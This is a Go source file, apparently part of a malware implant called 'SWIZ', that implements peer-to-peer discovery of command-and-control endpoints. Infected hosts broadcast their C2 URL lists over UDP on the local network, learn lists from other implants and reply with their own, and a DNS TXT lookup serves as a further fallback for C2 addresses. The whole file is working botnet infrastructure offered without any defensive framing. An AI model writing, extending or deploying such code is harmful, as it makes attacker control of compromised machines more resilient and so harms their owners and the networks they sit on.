package main

import (
	"context"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Discovery layer that supplements the primary C2 endpoints: LAN peer
// broadcast. Other implants share their C2 endpoint lists over UDP; the
// listener also answers with our own list. Opt-in via SWIZ_P2P=1.

// PeerDiscovery announces and learns C2 endpoint lists on the LAN.
type PeerDiscovery struct {
	port    int
	urls    func() []string
	add     func([]string)
	logf    func(string, ...interface{})
	closing chan struct{}
	conn    *net.UDPConn
	wg      sync.WaitGroup
}

// NewPeerDiscovery wires the discovery loop to the C2 client endpoint
// list (read via urls, extended via add).
func NewPeerDiscovery(port int, urls func() []string, add func([]string), logf func(string, ...interface{})) *PeerDiscovery {
	return &PeerDiscovery{
		port:    port,
		urls:    urls,
		add:     add,
		logf:    logf,
		closing: make(chan struct{}),
	}
}

func (p *PeerDiscovery) log(format string, args ...interface{}) {
	if p.logf != nil {
		p.logf(format, args...)
	}
}

// Start launches the listener and broadcaster goroutines.
func (p *PeerDiscovery) Start(ctx context.Context) {
	p.wg.Add(2)
	go p.listen(ctx)
	go p.broadcastLoop(ctx)
}

// Stop terminates the discovery goroutines.
func (p *PeerDiscovery) Stop() {
	close(p.closing)
	if p.conn != nil {
		p.conn.Close()
	}
	p.wg.Wait()
}

func (p *PeerDiscovery) done() bool {
	select {
	case <-p.closing:
		return true
	default:
		return false
	}
}

func (p *PeerDiscovery) announce() string {
	list := p.urls()
	if len(list) == 0 {
		return ""
	}
	return "SWIZC2 " + strings.Join(list, " ")
}

func (p *PeerDiscovery) listen(ctx context.Context) {
	defer p.wg.Done()
	conn, err := net.ListenUDP("udp", &net.UDPAddr{Port: p.port})
	if err != nil {
		p.log("p2p: listen %d failed: %v", p.port, err)
		return
	}
	p.conn = conn
	defer conn.Close()

	buf := make([]byte, 4096)
	for {
		n, addr, err := conn.ReadFromUDP(buf)
		if err != nil {
			if p.done() || ctx.Err() != nil {
				return
			}
			continue
		}
		msg := string(buf[:n])
		if !strings.HasPrefix(msg, "SWIZC2 ") {
			continue
		}
		list := strings.Fields(strings.TrimPrefix(msg, "SWIZC2 "))
		if len(list) > 0 {
			p.add(list)
			p.log("p2p: learned %v from %s", list, addr)
		}
		if resp := p.announce(); resp != "" {
			conn.WriteToUDP([]byte(resp), addr)
		}
	}
}

func (p *PeerDiscovery) broadcastLoop(ctx context.Context) {
	defer p.wg.Done()
	p.broadcastOnce()
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-p.closing:
			return
		case <-ticker.C:
			p.broadcastOnce()
		}
	}
}

func (p *PeerDiscovery) broadcastOnce() {
	ip := localIP()
	if ip == nil {
		return
	}
	msg := p.announce()
	if msg == "" {
		return
	}
	bcast := broadcastAddr(ip)
	if bcast == nil {
		return
	}
	conn, err := net.Dial("udp", net.JoinHostPort(bcast.String(), strconv.Itoa(p.port)))
	if err != nil {
		return
	}
	defer conn.Close()
	conn.Write([]byte(msg))
}

// broadcastAddr computes the /24 directed broadcast for an IPv4 host.
func broadcastAddr(ip net.IP) net.IP {
	v4 := ip.To4()
	if v4 == nil {
		return nil
	}
	out := make(net.IP, 4)
	copy(out, v4)
	out[3] = 255
	return out
}

// localIP returns the outbound interface address used for LAN scans.
func localIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return nil
	}
	defer conn.Close()
	if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
		return addr.IP
	}
	return nil
}

// dnsLookup queries a TXT record domain for C2 endpoint strings.
func dnsLookup(domain string) []string {
	if domain == "" {
		return nil
	}
	txts, err := net.LookupTXT(domain)
	if err != nil {
		return nil
	}
	var out []string
	for _, t := range txts {
		for _, part := range strings.Fields(t) {
			if strings.HasPrefix(part, "https://") || strings.HasPrefix(part, "http://") {
				out = append(out, part)
			}
		}
	}
	return out
}
